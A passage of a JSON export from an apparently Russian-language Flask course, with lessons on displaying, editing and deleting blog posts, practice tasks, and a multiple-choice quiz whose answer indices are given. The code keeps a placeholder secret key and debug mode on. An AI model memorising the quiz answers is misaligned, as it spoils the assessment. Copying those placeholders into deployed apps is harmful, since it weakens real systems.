New&quot;;\">127.0.0.1:5000/&lt;ID&gt;</span><span style=\"background-color:white;\"> &nbsp; будет отображать пост с соответствующим номером ID, если такой идентификатор существует в базе данных.</span></p><p><span style=\"background-color:white;\">&nbsp;</span></p><p><span style=\"background-color:white;\">1. Откройте файл app.py и замените весь код на следующий:</span></p><pre><code class=\"language-python\">import sqlite3\r\n \r\nfrom flask import Flask, render_template\r\nfrom werkzeug.exceptions import abort\r\n \r\ndef get_db_connection():\r\n &nbsp;&nbsp; conn = sqlite3.connect('database.db')\r\n &nbsp;&nbsp; conn.row_factory = sqlite3.Row\r\n &nbsp;&nbsp; return conn\r\n \r\ndef get_post(post_id):\r\n &nbsp;&nbsp; conn = get_db_connection()\r\n &nbsp;&nbsp; post = conn.execute('SELECT * FROM posts WHERE id = ?',\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (post_id,)).fetchone()\r\n &nbsp;&nbsp; conn.close()\r\n &nbsp;&nbsp; if post is None:\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; abort(404)\r\n &nbsp;&nbsp; return post\r\n \r\napp = Flask(__name__)\r\n \r\n@app.route('/')\r\ndef index():\r\n &nbsp;&nbsp; conn = get_db_connection()\r\n &nbsp;&nbsp; posts = conn.execute('SELECT * FROM posts').fetchall()\r\n &nbsp;&nbsp; conn.close()\r\n &nbsp;&nbsp; return render_template('index.html', posts=posts)\r\n \r\n@app.route('/&lt;int:post_id&gt;')\r\ndef post(post_id):\r\n &nbsp;&nbsp; post = get_post(post_id)\r\n &nbsp;&nbsp; return render_template('post.html', post=post)\r\n \r\nif __name__ == '__main__':\r\n   app.run(debug=True)</code></pre><p><span style=\"background-color:white;\">В этом коде дополнительно:</span></p><p><span style=\"background-color:white;\">Импортируется функция </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">abort()</span><span style=\"background-color:white;\"> из библиотеки Werkzeug. Она позволит формировать ответ Flask с сообщением </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">404 Not Found</span><span style=\"background-color:white;\">​​​, если пост блога с указанным в URL идентификатором не существует.</span></p><p><span style=\"background-color:white;\">Создается функция </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">get_post()</span><span style=\"background-color:white;\">, принимающая аргумент </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">post_id</span><span style=\"background-color:white;\"> с идентификатором поста блога, который необходимо получить.</span></p><p><span style=\"background-color:white;\">В этой функции:</span></p><p><span style=\"background-color:white;\">- объекту conn присваивается объект подключения к БД, возвращенный функцией </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">get_db_connection()</span><span style=\"background-color:white;\">;</span></p><p><span style=\"background-color:white;\">- с помощью метода </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">fetchone()</span><span style=\"background-color:white;\"> объекту post присваивается результат выполнения SQL-запроса, получающего из БД строку с постом блога с идентификатором, соответствующим значению </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">post_id</span><span style=\"background-color:white;\">;</span></p><p><span style=\"background-color:white;\">- с помощью метода </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">close()</span><span style=\"background-color:white;\"> закрывается подключение к базе данных;</span></p><p><span style=\"background-color:white;\">- если пост с переданным в </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">post_id</span><span style=\"background-color:white;\"> идентификатором не найден, используется функция </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">abort()</span><span style=\"background-color:white;\"> для ответа с кодом ошибки 404, после чего выполнение функции завершается;</span></p><p><span style=\"background-color:white;\">- если пост с переданным в </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">post_id</span><span style=\"background-color:white;\"> идентификатором найден, функция возвращает объект post, содержащий строку таблицы БД для этого поста.</span></p><p><span style=\"background-color:white;\">Создается функция визуализации </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">post(post_id)</span><span style=\"background-color:white;\">.</span></p><p><span style=\"background-color:white;\">В этой функции:</span></p><p><span style=\"background-color:white;\">декоратором добавляется правило переменной </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">&lt;int:post_id&gt;</span><span style=\"background-color:white;\">, которое указывает, что URL после / представляет собой положительное целое число (отмеченное конвертером int), использующееся функцией визуализации;</span></p><p><span style=\"background-color:white;\">с помощью функции </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">get_post(post_id)</span><span style=\"background-color:white;\"> объекту post присваивается содержимое строки таблицы БД, соответствующей посту блога с указанным идентификатором;</span></p><p><span style=\"background-color:white;\">возвращается HTML-код страницы просмотра поста, сформированный из шаблона post.html, в который в качестве аргумента передается объект post с содержимым поста.</span></p><p><span style=\"background-color:white;\">Сохраните и закройте файл </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">app.py</span><span style=\"background-color:white;\">.</span></p><p><span style=\"background-color:white;\">&nbsp;</span></p><p><span style=\"background-color:white;\">2. Создайте и откройте файл-шаблон post.html в директории templates:</span></p><p><span style=\"background-color:white;\">Добавьте в файл следующий код:</span></p><pre><code class=\"language-jinja2\">{% extends 'base.html' %}\r\n \r\n{% block content %}\r\n  &lt;h2&gt;{%block title%} {{ post['title'] }} {%endblock%}&lt;/h2&gt;\r\n  &lt;p&gt;{{ post['content'] }}&lt;/p&gt;\r\n  &lt;span class=\"badge text-bg-primary\"&gt;{{ post['created'] }}&lt;/span&gt;\r\n{% endblock %}</code></pre><p><span style=\"background-color:white;\">Этот код похож на код в шаблоне index.html. Различие в том, что здесь не используется цикл for, так как шаблон должен отображать единичный пост с его содержимым </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">post['content']</span><span style=\"background-color:white;\">.</span></p><p><br><span style=\"background-color:white;\">Сохраните и закройте файл post.html.</span></p><p>&nbsp;</p><p><span style=\"background-color:white;\">Откройте URL </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">127.0.0.1:5000/1</span><span style=\"background-color:white;\"> и </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">127.0.0.1:5000/2</span><span style=\"background-color:white;\">, чтобы просмотреть два первых поста, созданных одновременно с базой данных.</span></p><p><span style=\"background-color:white;\">Откройте URL </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">127.0.0.1:5000/3</span><span style=\"background-color:white;\">, и вы увидите страницу с ошибкой 404.</span></p><p><span style=\"background-color:white;\">&nbsp;</span></p><p><span style=\"background-color:white;\">3. Добавьте на главную страницу приложения ссылки, ведущие с заголовков постов на страницы просмотра их содержимого.</span></p><p><span style=\"background-color:white;\">Откройте шаблон index.html:</span></p><p><span style=\"background-color:white;\">Замените значение атрибута href с</span></p><p><span style=\"background-color:white;\"><code>#</code></span></p><p><span style=\"background-color:white;\">на</span></p><p><span style=\"background-color:white;\"><code>{{ url_for('post', post_id=post['id']) }}</code></span></p><p><span style=\"background-color:white;\">, чтобы цикл for выглядел следующим образом:</span></p><p><span style=\"background-color:white;\"><i>Внимание! С этого момента мы будем менять только часть кода в файлах</i>.</span></p><pre><code class=\"language-jinja2\">{% for post in posts %}\r\n  &lt;a href=\"{{ url_for('post', post_id=post['id']) }}\"&gt;\r\n &nbsp;&nbsp; &lt;h2&gt;{{ post['title'] }}&lt;/h2&gt;\r\n  &lt;/a&gt;\r\n  &lt;span class=\"badge text-bg-primary\"&gt;{{ post['created'] }}&lt;/span&gt;\r\n  &lt;hr&gt;\r\n{% endfor %}</code></pre><p><span style=\"background-color:white;\">Функция </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">url_for()</span><span style=\"background-color:white;\"> в качестве аргументов принимает:</span></p><p><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">'post'</span><span style=\"background-color:white;\"> — функцию визуализации post() описанную в файле app.py.</span></p><p><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">post</span><span style=\"background-color:white;\">_</span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">id</span><span style=\"background-color:white;\"> — переменную со значением идентификатора поста post['id'], необходимого для функции визуализации.</span></p><p><span style=\"background-color:white;\">Функция </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">url_for()</span><span style=\"background-color:white;\"> для каждого заголовка поста возвращает корректный URL, основанный на его идентификаторе.</span></p><p><span style=\"background-color:white;\">&nbsp;</span></p><p><span style=\"background-color:white;\">Сохраните и закройте файл </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">index.html</span><span style=\"background-color:white;\">.</span></p><p><span style=\"background-color:white;\">&nbsp;</span></p><p><span style=\"background-color:white;\">Перейдите к главной странице приложения </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">127.0.0.1:5000</span><span style=\"background-color:white;\"> и убедитесь, что заголовки постов работают как ссылки для перехода к их содержимому.</span></p><p><span style=\"background-color:white;\">&nbsp;</span></p>"
            },
            "is_published": true
        },
        {
            "id": 17,
            "section_id": 2,
            "number": 4,
            "name": "Редактирование и удаление постов",
            "slug": "posts-editing-and-deleting",
            "content": {
                "tasks": [
                    {
                        "id": 1,
                        "content": "<p>Проверка пустого содержимого поста</p><p>Реализуйте проверку, при которой нельзя сохранить изменения, если поле content пустое или содержит только пробелы.</p>"
                    },
                    {
                        "id": 2,
                        "content": "<p>Сообщение об успешном редактировании</p><p>После успешного редактирования поста выводите всплывающее сообщение (flash) с текстом вроде:</p><p>«Пост успешно обновлён».</p>"
                    },
                    {
                        "id": 3,
                        "content": "<p>Отмена редактирования поста</p><p>Добавьте кнопку «Отмена», которая возвращает пользователя на страницу поста без сохранения изменений.</p>"
                    },
                    {
                        "id": 4,
                        "content": "<p>Отображение даты последнего редактирования</p><p>Добавьте в таблицу posts поле updated, обновляйте его при редактировании поста и выводите дату последнего изменения на главной странице.</p>"
                    },
                    {
                        "id": 5,
                        "content": "<p>Логирование действий редактирования и удаления</p><p>Реализуйте простой лог в текстовый файл, куда будут записываться:</p><p>ID поста</p><p>тип действия (edit или delete)</p><p>дата и время</p>"
                    }
                ],
                "tests": [
                    {
                        "id": 1,
                        "options": [
                            "GET используется для обработки отправленных данных формы, POST — для отображения формы ",
                            "GET используется для отображения формы, POST — для обработки отправленных данных формы ",
                            "GET используется для получения данных из базы данных, POST — для обработки отправленных данных формы ",
                            "GET используется для сохранения изменений в базе данных, POST используется для загрузки HTML-шаблона"
                        ],
                        "question": "Почему функция edit() принимает и GET-, и POST-запросы?",
                        "correct_index": 1
                    },
                    {
                        "id": 2,
                        "options": [
                            "Возвращает пустой объект post",
                            "Перенаправляет пользователя на главную страницу",
                            "Вызывает исключение abort(404) ",
                            "Создаёт новый пост с этим ID"
                        ],
                        "question": "Что делает функция get_post(post_id) при отсутствии поста с указанным ID?",
                        "correct_index": 2
                    },
                    {
                        "id": 3,
                        "options": [
                            "Для экранирования HTML-тегов в заголовке",
                            "Для отображения данных формы, а при их отсутствии — данных из базы ",
                            "Для обязательного заполнения поля заголовка",
                            "Для передачи данных 'title' и post['title'] обратно в Flask"
                        ],
                        "question": "Зачем в шаблоне edit.html используется выражение {{ request.form.get('title', post['title']) }}?",
                        "correct_index": 1
                    },
                    {
                        "id": 4,
                        "options": [
                            "Отвечает за стилизацию интерфейса, подключение CSS-фреймворков и адаптацию внешнего вида под разные устройства",
                            "Запускает и исполняет JavaScript-код непосредственно в браузере пользователя",
                            "Хранит изображения, шрифты и статические файлы без участия логики",
                            "Обрабатывает запросы клиента и формирует ответы сервера "
                        ],
                        "question": "Какую роль выполняет серверная часть web-приложения?",
                        "correct_index": 3
                    },
                    {
                        "id": 5,
                        "options": [
                            "Для выполнения SQL-запросов внутри HTML-кода",
                            "Для разделения логики приложения и представления данных ",
                            "Для защиты от сетевых атак и XSS-уязвимостей",
                            "Для автоматического создания CSS-стилей"
                        ],
                        "question": "Зачем в web-приложениях используются шаблонизаторы?",
                        "correct_index": 1
                    },
                    {
                        "id": 6,
                        "options": [
                            "Потому что формы позволяют выполнять сложную бизнес-логику без сервера",
                            "Потому что формы поддерживаются браузерами и HTTP-протоколом ",
                            "Потому что формы автоматически шифруют пользовательские данные",
                            "Потому что формы заменяют работу JavaScript и API"
                        ],
                        "question": "Почему HTML-формы широко используются для передачи данных на сервер?",
                        "correct_index": 1
                    },
                    {
                        "id": 7,
                        "options": [
                            "GET используется только для навигации, а POST — исключительно для API",
                            "POST не поддерживается всеми браузерами и требует дополнительных настроек",
                            "GET не изменяет состояние сервера, POST может его изменять ",
                            "GET всегда передаёт данные скрыто, а POST — только в URL"
                        ],
                        "question": "В чём заключается принципиальное различие между HTTP-методами GET и POST?",
                        "correct_index": 2
                    }
                ],
                "theory_html": "<h4>Редактирование существующего поста</h4><p>Создайте страницу, на которой можно отредактировать существующий пост.</p><p>&nbsp;</p><p>1. Добавьте функцию маршрута edit(). (edit - редактирование)</p><p>Откройте файл app.py и замените весь код на следующий:</p><pre><code class=\"language-python\">import sqlite3\r\nfrom flask import Flask, render_template, request, url_for, flash, redirect\r\nfrom werkzeug.exceptions import abort\r\n\r\ndef get_db_connection():\r\n &nbsp;&nbsp;&nbsp;conn = sqlite3.connect('database.db')\r\n &nbsp;&nbsp;&nbsp;conn.row_factory = sqlite3.Row\r\n &nbsp;&nbsp;&nbsp;return conn\r\n\r\ndef get_post(post_id):\r\n &nbsp;&nbsp;&nbsp;conn = get_db_connection()\r\n &nbsp;&nbsp;&nbsp;post = conn.execute('SELECT * FROM posts WHERE id = ?',\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(post_id,)).fetchone()\r\n &nbsp;&nbsp;&nbsp;conn.close()\r\n &nbsp;&nbsp;&nbsp;if post is None:\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;abort(404)\r\n &nbsp;&nbsp;&nbsp;return post\r\n\r\napp = Flask(__name__)\r\n\r\napp.config['SECRET_KEY'] = 'your secret key'\r\n\r\n@app.route('/')\r\ndef index():\r\n &nbsp;&nbsp;&nbsp;conn = get_db_connection()\r\n &nbsp;&nbsp;&nbsp;posts = conn.execute('SELECT * FROM posts').fetchall()\r\n &nbsp;&nbsp;&nbsp;conn.close()\r\n &nbsp;&nbsp;&nbsp;return render_template('index.html', posts=posts)\r\n\r\n@app.route('/&lt;int:post_id&gt;')\r\ndef post(post_id):\r\n &nbsp;&nbsp;&nbsp;post = get_post(post_id)\r\n &nbsp;&nbsp;&nbsp;return render_template('post.html', post=post)\r\n\r\n@app.route('/create', methods=('GET', 'POST'))\r\ndef create():\r\n &nbsp;if request.method == 'POST':\r\n &nbsp;&nbsp;&nbsp;title = request.form['title']\r\n &nbsp;&nbsp;&nbsp;content = request.form['content']\r\n &nbsp;&nbsp;&nbsp;if not title:\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flash('Нет заголовка поста!')\r\n &nbsp;&nbsp;&nbsp;else:\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;conn = get_db_connection()\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;conn.execute(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'INSERT INTO posts (title, content) VALUES (?, ?)',\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(title, content)\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;conn.commit()\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;conn.close()\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return redirect(url_for('index'))\r\n &nbsp;return render_template('create.html')\r\n\r\n@app.route('/&lt;int:post_id&gt;/edit', methods=('GET', 'POST'))\r\ndef edit(post_id):\r\n &nbsp;post = get_post(post_id)\r\n &nbsp;if request.method == 'POST':\r\n &nbsp;&nbsp;&nbsp;title = request.form['title']\r\n &nbsp;&nbsp;&nbsp;content = request.form['content']\r\n &nbsp;&nbsp;&nbsp;if not title:\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flash('Нет заголовка поста')\r\n &nbsp;&nbsp;&nbsp;else:\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;conn = get_db_connection()\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;conn.execute('UPDATE posts SET title = ?, content = ?'\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' WHERE id = ?',\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(title, content, post_id))\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;conn.commit()\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;conn.close()\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return redirect(url_for('index'))\r\n &nbsp;return render_template('edit.html', post=post)\r\n\r\nif __name__ == \"__main__\" :\r\n &nbsp;&nbsp;app.run(debug = True)</code></pre><p>В этом коде дополнительное добавилось:<br>Обработчик маршрута edit, который подтягивает определённый пост по его ID, и для этого поста визуализирует страницу edit.html<br><code>@app.route('/&lt;int:post_id&gt;/edit', methods=('GET', 'POST'))</code><br><code>def edit(post_id):</code></p><p>Процесс редактирования существующего поста похож на процесс создания нового, поэтому эта функция визуализации почти идентична функции визуализации create().</p><p>Пост, который необходимо отредактировать, задается в URL '/&lt;int:post_id&gt;/edit', а идентификатор поста передается в функцию edit() в аргументе post_id. Это же значение передается и в функцию get_post(), чтобы получить текущее содержимое поста из базы данных.</p><p>Измененные данные поступят в приложение в POST-запросе, который обрабатывается внутри условия if request.method == 'POST'.</p><p>Как и при создании нового поста, функция извлекает в отдельные переменные данные из объекта request.form, после чего выполняет проверку на заполнение пользователем заголовка поста. Если заголовок не заполнен, функция показывает всплывающее сообщение об обязательности заполнения этого поля. В остальных случаях функция открывает подключение к базе данных и обновляет поля в строке с нужным постом в таблице posts. Идентификатор поста в базе данных соответствует идентификатору ID, указанному в URL.</p><p>В случае GET-запроса функция возвращает HTML-код, сформированный из шаблона edit.html с подставленными из объекта post значениями заголовка и текста поста.</p><p>Сохраните и закройте файл app.py.</p><p>&nbsp;</p><p>2. Создайте и откройте файл-шаблон edit.html в директории templates:</p><p>Добавьте в файл следующий код:</p><pre><code class=\"language-jinja2\">{% extends 'base.html' %}\r\n\r\n{% block content %}\r\n\r\n&lt;h1&gt;{%block title%}\r\n  Редактирование \"{{post['title']}}\"\r\n{%endblock%}&lt;/h1&gt;\r\n\r\n&lt;form method=\"post\"&gt;\r\n  &lt;div class=\"mb-3\"&gt;\r\n &nbsp;&nbsp; &lt;label for=\"title\" class=\"col-sm-2 col-form-label\"&gt; Title  &nbsp;&nbsp; &lt;/label&gt;\r\n &nbsp;&nbsp; &lt;input type=\"text\" name=\"title\" placeholder=\"Post title\"\r\n &nbsp;&nbsp;  class=\"form-control\"\r\n &nbsp;&nbsp;  value=\"{{ request.form.get('title', post['title']) }}\"&gt;\r\n  &lt;/div&gt;\r\n\r\n  &lt;div class=\"mb-3\"&gt;\r\n &nbsp;&nbsp; &lt;label for=\"content\" class=\"col-sm-2 col-form-label\"&gt; Content &lt;/label&gt;\r\n &nbsp;&nbsp; &lt;textarea name=\"content\"\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; placeholder=\"Post content\"\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; class=\"form-control\"\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rows=\"3\"&gt;\r\n &nbsp;    {{ request.form.get('content', post['content']) }}\r\n &nbsp;  &lt;/textarea&gt;\r\n  &lt;/div&gt;\r\n  &lt;div class=\"mb-3\"&gt;\r\n &nbsp;&nbsp; &lt;button type=\"submit\" class=\"btn btn-primary\"&gt; Submit  &nbsp;&nbsp; &lt;/button&gt;\r\n  &lt;/div&gt;\r\n&lt;/form&gt;\r\n&lt;hr&gt;\r\n\r\n{% endblock %}</code></pre><p>Код аналогичен коду шаблона create.html за исключением выражений</p><p><code>{{ request.form.get('title', post['title']) }}</code><span style=\"color:red;\"><code>&nbsp;</code> &nbsp;</span></p><p>и</p><p><code>{{ request.form.get('content', post['content']) }}</code><span style=\"color:red;\"><code> </code>.</span></p><p>Эти выражения отображают данные, сохраненные в запросе, а если запроса не существует, — данные из переданной в шаблон переменной post с текущими значениями из базы данных.</p><p>Сохраните и закройте файл edit.html.</p><p>&nbsp;</p><p>3. Откройте URL <code>127.0.0.1:5000/1/edit</code> для редактирования первого поста. Вы увидите страницу Редактирование \"Заголовок поста\" с данными поста. Отредактируйте пост, отправьте форму и убедитесь, что пост был обновлен.</p><p>На главной странице приложения добавьте для каждого поста из списка ссылку на страницу редактирования.</p><p>&nbsp;</p><p>4. Откройте шаблон index.html.</p><p>Замените весь код на следующий:</p><pre><code class=\"language-jinja2\">{% extends 'base.html' %}\r\n\r\n{% block content %}\r\n &nbsp;&lt;h1&gt;{% block title %}\r\n &nbsp;&nbsp;&nbsp;Добро пожаловать в FlaskBlog {% endblock %}\r\n &nbsp;&lt;/h1&gt;\r\n\r\n &nbsp;{% for post in posts %}\r\n &nbsp;&nbsp;&nbsp;&lt;a href=\"{{ url_for('post', post_id=post['id']) }}\"&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;h2&gt;{{ post['title'] }}&lt;/h2&gt;\r\n &nbsp;&nbsp;&nbsp;&lt;/a&gt;\r\n &nbsp;&nbsp;&nbsp;&lt;span class=\"badge text-bg-primary\"&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{{ post['created'] }}\r\n &nbsp;&nbsp;&nbsp;&lt;/span&gt;\r\n &nbsp;&nbsp;&nbsp;&lt;a href=\"{{ url_for('edit', post_id=post['id']) }}\"&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;span class=\"badge text-bg-warning\"&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Редактирование\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/span&gt;\r\n &nbsp;&nbsp;&nbsp;&lt;/a&gt;\r\n &nbsp;&nbsp;&nbsp;&lt;hr&gt;\r\n &nbsp;{% endfor %}\r\n\r\n{% endblock %}</code></pre><p>В этом коде, к заголовкам постов на главной странице добавляется ссылка \"Редактирование\" (после даты создания поста), которая указывает на функцию маршрута edit() и передает в неё значение идентификатора поста из post['id'].</p><p>Сохраните и закройте файл index.html.</p><p>&nbsp;</p><p>5. Перейдите на главную страницу приложения <code>127.0.0.1:5000</code> и убедитесь, что на ней появились ссылки \"Редактирование\", с помощью которых можно изменять содержимое постов.</p><p>&nbsp;</p><h4>Удаление поста</h4><p>1. Откройте файл app.py:</p><p>В конце файла (но до кода запуска) добавьте функцию визуализации delete():</p><pre><code class=\"language-python\">@app.route('/&lt;int:post_id&gt;/delete', methods=('POST',))\r\ndef delete(post_id):\r\n &nbsp;&nbsp; post = get_post(post_id)\r\n &nbsp;&nbsp; conn = get_db_connection()\r\n &nbsp;&nbsp; conn.execute('DELETE FROM posts WHERE id = ?', (post_id,))\r\n &nbsp;&nbsp; conn.commit()\r\n &nbsp;&nbsp; conn.close()\r\n &nbsp;&nbsp; flash('\"{}\" Удалён'.format(post['title']))\r\n &nbsp;&nbsp; return redirect(url_for('index'))</code></pre><p>Эта функция принимает только POST-запросы. Это значит, что просто переход в браузере по адресу <code>127.0.0.1:5000/ID/delete</code> вернет ошибку, поскольку веб-браузеры по умолчанию используют GET-запросы. POST-запрос по этому маршруту можно отправить только через форму, передающую идентификатор поста, который требуется удалить.</p><p>Получив POST-запрос, функция открывает подключение к базе данных и выполняет SQL-команду DELETE FROM, после чего изменения фиксируются, а подключение закрывается. Приложение перенаправляет пользователя на главную страницу и показывает сообщение о том, что пост был успешно удален.</p><p>Кнопка Delete будет добавлена на страницу редактирования поста, поэтому для этой функции не нужен отдельный шаблон.</p><p>Сохраните и закройте файл app.py.</p><p>&nbsp;</p><p>2. Добавьте внизу кнопку удаления поста, внутри формы запускающей функцию маршрута удаления поста.</p><p>Откройте шаблон edit.html. Замените весь код на следующий:</p><pre><code class=\"language-jinja2\">{% extends 'base.html' %}\r\n\r\n{% block content %}\r\n&lt;h1&gt;{%block title%}\r\n &nbsp;Редактирование \"{{post['title']}}\"\r\n{%endblock%}&lt;/h1&gt;\r\n\r\n&lt;form method=\"post\"&gt;\r\n &nbsp;&lt;div class=\"mb-3\"&gt;\r\n &nbsp;&nbsp;&nbsp;&lt;label for=\"title\" class=\"col-sm-2 col-form-label\"&gt;Заголовок&lt;/label&gt;\r\n &nbsp;&nbsp;&nbsp;&lt;input type=\"text\"\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;name=\"title\"\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;placeholder=\"Post title\"\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;class=\"form-control\"\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;value=\"{{ request.form.get('title', post['title']) }}\"&gt;\r\n &nbsp;&lt;/div&gt;\r\n\r\n &nbsp;&lt;div class=\"mb-3\"&gt;\r\n &nbsp;&nbsp;&nbsp;&lt;label for=\"content\" class=\"col-sm-2 col-form-label\"&gt;Содержание&lt;/label&gt;\r\n &nbsp;&nbsp;&nbsp;&lt;textarea name=\"content\"\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;placeholder=\"Post content\"\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;class=\"form-control\"\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rows=\"3\"&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{{ request.form.get('content', post['content']) }}\r\n &nbsp;&nbsp;&nbsp;&lt;/textarea&gt;\r\n &nbsp;&lt;/div&gt;\r\n\r\n &nbsp;&lt;div class=\"mb-3\"&gt;\r\n &nbsp;&nbsp;&nbsp;&lt;button type=\"submit\" class=\"btn btn-primary\"&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Подтвердить\r\n &nbsp;&nbsp;&nbsp;&lt;/button&gt;\r\n &nbsp;&lt;/div&gt;\r\n\r\n&lt;/form&gt;\r\n&lt;hr&gt;\r\n\r\n&lt;form action=\"{{ url_for('delete', post_id=post['id']) }}\"\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;method=\"POST\"&gt;\r\n &nbsp;&lt;input type=\"submit\"\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;value=\"Удалить пост\"\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;class=\"btn btn-danger btn-sm\"\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;onclick=\"return confirm('Удалить пост?')\"&gt;\r\n&lt;/form&gt;\r\n\r\n{% endblock %}</code></pre><p>В этом коде используется JS метод confirm(), запрашивающий подтверждение согласия пользователя перед отправкой запроса.</p><p>Сохраните и закройте файл edit.html.</p><p>&nbsp;</p><p>3. Перейдите на главную страницу приложения, а потом на страницу редактирования какого ни будь поста, например&nbsp; <code>127.0.0.1:5000/1/edit</code> и убедитесь, что на странице редактирования поста появилась кнопка \"Удалить пост\", удаляющая пост. Удалите пост и убедитесь, что пост удалился.</p><p>&nbsp;</p><p>&nbsp;</p><p style=\"text-align:center;\"><strong>Разработка приложения завершена!</strong></p><p>&nbsp;</p><p>&nbsp;</p><p>Полный код проекта (все файлы) вы можете найти на моём гитхабе:</p><p><span 